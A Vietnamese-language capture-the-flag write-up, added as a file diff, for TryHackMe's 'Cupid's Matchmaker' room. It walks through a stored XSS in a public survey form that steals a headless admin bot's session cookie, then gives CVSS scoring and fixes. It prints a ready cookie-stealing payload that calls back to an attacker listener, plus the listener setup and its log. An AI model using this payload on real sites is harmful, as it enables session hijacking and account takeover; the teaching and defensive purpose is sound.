@@ -1,0 +1,143 @@
+---
+title: "Cupid's Matchmaker"
+description: 'Phiên bản tiếng Việt: Stored XSS không cần xác thực ở form khảo sát công khai chạy trong ngữ cảnh của admin review bot và đánh cắp session cookie — chiếm phiên admin, không cần tài khoản, không cần tương tác.'
+date: 2026-10-03
+platform: tryhackme
+room: "Cupid's Matchmaker"
+roomUrl: 'https://tryhackme.com/room/lafb2026e3'
+difficulty: easy
+tags:
+  - 'web'
+  - 'xss'
+  - 'stored-xss'
+  - 'cookie-theft'
+  - 'session-hijacking'
+vulnClasses:
+  - 'stored cross-site scripting'
+  - 'missing output encoding'
+  - 'session cookie theft'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Cupid's Matchmaker — Stored XSS không cần xác thực đánh cắp session cookie của admin bot**
+
+_Bài hướng dẫn giải challenge web "Cupid's Matchmaker" trong sự kiện Love at First Breach 2026 của TryHackMe. Một form khảo sát công khai render các trường người dùng nhập lên trang review của admin mà không mã hóa output. Một admin bot headless tự động mở mọi submission mới, nên một_ _`<script>`_ _cài vào một trường khảo sát sẽ chạy trong ngữ cảnh trình duyệt của admin và beacon session cookie thẳng về cho ta — không cần tài khoản, không cần nạn nhân click, không cần social engineering._
+
+> Flag và các IP tấn công/mục tiêu đã được ẩn. Cupid's Matchmaker là challenge huấn luyện hợp pháp trên TryHackMe; mọi thao tác đều thực hiện trên mục tiêu luyện tập được phép. Flag hiển thị dạng `THM{<redacted>}`; giá trị thật có trên box nhưng được giữ kín ở đây.
+
+---
+
+### **TL;DR — toàn bộ chuỗi tấn công**
+
+<Callout type="tldr">
+
+Form công khai `POST /survey` nhận submission từ bất kỳ ai **mà không cần xác thực**. Các trường này sau đó được render trên trang review nội bộ `/admin` **không mã hóa output** → một **admin review bot** headless tự động ghé thăm mọi submission mới, **không cần tương tác của người dùng** → một `<script>` cài vào một trường khảo sát (ví dụ `ideal_date`) thực thi trong **ngữ cảnh trình duyệt của admin** kèm cookie của admin → script beacon `document.cookie` về listener của attacker → **session cookie của admin bị đánh cắp từ vị trí không xác thực**, và trong trường hợp này giá trị lấy được lộ trực tiếp flag của phòng.
+
+Submission ẩn danh → script chạy với tư cách admin bot → session cookie của admin trong chưa đầy một phút, hoàn toàn lặp lại được.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-tun0-ip>
+```
+
+Cupid's Matchmaker là một web app matchmaking kiểu Flask chạy trên cổng 5000 với một form khảo sát công khai:
+
+```text
+http://$IP:5000/survey   →  public "find your match" survey (no login)
+```
+
+Bất kỳ form nào thu thập free-text từ công chúng **và** được xem xét bởi một người (hoặc một bot) trong khu vực quản trị đều là ứng viên hàng đầu cho **stored XSS**: attacker viết, bên có đặc quyền đọc, và payload chạy ở _phía bên kia_ ranh giới tin cậy.
+
+### **Lỗ hổng: các trường khảo sát được render cho admin mà không escape**
+
+Endpoint `/survey` lưu bất cứ thứ gì bạn gửi rồi sau đó render nguyên văn trên trang review của admin. Vì các trường được gửi (`name`, `ideal_date`, `describe_yourself`, `looking_for`, `dealbreakers`, …) được xuất ra trang admin **không mã hóa output HTML** — autoescaping của Jinja2 bị vô hiệu bằng `|safe`/`Markup()` trên dữ liệu không tin cậy — nên mọi HTML/JS trong đó trở thành markup sống trong DOM của admin.
+
+<Callout type="insight">
+
+Hai đặc điểm khiến lỗi này nghiêm trọng hơn một stored XSS thông thường:
+
+- **Không cần xác thực để chèn.** Form khảo sát công khai, nên attacker cần **không đặc quyền** nào để cài payload.
+- **Nạn nhân là một bot tự động, không phải con người.** Phiên review admin headless tự mở mọi submission mới — **không click, không tương tác** — và nó mang theo cookie phiên của admin. Payload chạy trong một security scope _khác, cao hơn_ so với người gửi (một scope change theo CVSS).
+
+</Callout>
+
+### **Bước 1 — dựng listener trên máy tấn công**
+
+Payload sẽ beacon cookie đánh cắp được ra ngoài (out-of-band), nên ta cần thứ gì đó để hứng callback:
+
+```text
+python3 -m http.server 8000
+# Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+### **Bước 2 — gửi payload qua form khảo sát công khai (không cần auth)**
+
+Ta thả một `<script>` đánh cắp cookie kinh điển vào một trong các trường được render (`ideal_date` hoạt động tốt). Phần còn lại chỉ là dữ liệu lấp đầy hợp lý để submission trông như một khảo sát bình thường:
+
+```text
+curl -s "http://$IP:5000/survey" \
+  --data-urlencode "name=Eve" \
+  --data-urlencode "age=27" \
+  --data-urlencode "gender=Female" \
+  --data-urlencode "seeking=Any" \
+  --data-urlencode "ideal_date=<script>fetch('http://$ATTACKER_IP:8000/?c='+document.cookie)</script>" \
+  --data-urlencode "describe_yourself=Sweet, simple, honest" \
+  --data-urlencode "looking_for=Someone kind" \
+  --data-urlencode "dealbreakers=none"
+```
+
+Một request duy nhất đó là PoC hoàn chỉnh, copy-paste được. Không session, không CSRF token, không cần foothold trước đó — chỉ là một form POST mà bất kỳ ai trong mạng đều gửi được.
+
+### **Bước 3 — admin bot bắn payload ngược về chúng ta**
+
+Trong chưa đầy một phút, phiên review admin headless mở submission, script của ta chạy kèm cookie của admin, và listener ghi nhận callback **xuất phát từ chính mục tiêu** — mức xác nhận out-of-band chứng minh code thực sự chạy, chứ không phải một lần render tự thân trong trình duyệt:
+
+```text
+10.x.x.x - - [03/Oct/2026 08:24:08] "GET /?c=flag=THM{<redacted>} HTTP/1.1" 200 -
+10.x.x.x - - [03/Oct/2026 08:25:19] "GET /?c=flag=THM{<redacted>} HTTP/1.1" 200 -
+10.x.x.x - - [03/Oct/2026 08:26:31] "GET /?c=flag=THM{<redacted>} HTTP/1.1" 200 -
+```
+
+Callback đến từ IP của mục tiêu mỗi lần bot review lại submission, nên cuộc tấn công tự động và lặp lại được cho đến khi lỗi được vá. Giá trị exfiltrate mang theo trực tiếp flag của phòng, cho thấy ngữ cảnh review của admin chứa dữ liệu nhạy cảm có thể tiếp cận hoàn toàn qua lỗ chèn này:
+
+```text
+THM{<redacted>}
+```
+
+Submission khảo sát ẩn danh → script thực thi với tư cách admin bot → session cookie của admin (và flag) trong listener của ta. Mọi nấc thang đều không cần xác thực.
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 9.3** (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N`). Khác với mức cơ sở "High" thường thấy của stored XSS — vốn giả định nạn nhân có tài khoản (`PR:L`) và phải tự mở trang (`UI:R`) — ở đây cả hai đều rơi vào trường hợp xấu nhất:
+
+- **Đánh cắp toàn bộ session cookie của admin review bot từ vị trí không xác thực** — tương đương chiếm tài khoản admin, vì cookie đó là thông tin xác thực duy nhất cần để mạo danh phiên.
+- **Không đặc quyền và không tương tác.** Form khảo sát công khai và admin bot tự ghé thăm mọi submission, nên đây là một vector tấn công tự động, lặp lại được, không phải một lần duy nhất.
+- **Scope change.** Payload thực thi trong ngữ cảnh review của admin — một security scope khác với người gửi ẩn danh — chính là lý do nó được chấm Critical thay vì High thông thường.
+
+</Callout>
+
+### **Khắc phục đề xuất — mã hóa output, khống chế cookie**
+
+<Callout type="fix">
+
+1. **Escape mọi trường khảo sát do người dùng gửi khi render trên trang review của admin.** Dựa vào autoescaping mặc định của Jinja2 và bỏ mọi `|safe` / `Markup()` áp lên dữ liệu không tin cậy (`name`, `ideal_date`, `describe_yourself`, `looking_for`, `dealbreakers`, …). Mã hóa output tại sink mới là cách sửa thực sự.
+2. **Thêm Content-Security-Policy** trên trang review của admin để hạn chế nguồn script (không inline script), để ngay cả một thẻ được chèn cũng không thể thực thi hay beacon ra ngoài.
+3. **Khống chế cookie phiên.** Đánh dấu cookie của review bot là `HttpOnly`, giới hạn scope chặt, và để thời hạn ngắn, để một lần DOM bị xâm phạm không mang lại một thông tin xác thực admin bền vững, tái sử dụng được.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **Stored XSS là về** **\*nơi nó render\*\*\***, không phải nơi nó được gửi.\*\* Một form công khai nuôi dữ liệu cho một trang quản trị đặc quyền cho phép attacker ẩn danh chạy code trong ngữ cảnh của admin.
+- **Một review bot là nạn nhân XSS hoàn hảo.** Nó đã xác thực, nó ghé thăm mọi submission, và nó không bao giờ "từ chối click" — điều này đẩy các chỉ số user-interaction và privilege của CVSS về trường hợp xấu nhất.
+- **Mã hóa output tại sink.** Escape trên trang admin — không phải lọc input trên form khảo sát — mới thực sự đóng được lỗ. `|safe` trên dữ liệu không tin cậy chính là cách autoescaping bị vô hiệu.
+- **Phòng thủ nhiều lớp có giá trị.** Một CSP và một cookie `HttpOnly`, thời hạn ngắn mỗi thứ độc lập làm giảm đòn tấn công ngay cả khi một lỗi encoding lọt lưới.
+
+Cảm ơn bạn đã đọc. Cupid's Matchmaker là một bài học gọn gàng về hình dạng thật của stored XSS: mối nguy không nằm ở form bạn gõ vào, mà ở trang đặc quyền render lại văn bản của bạn — và một admin bot đọc mọi thứ, không cần click.
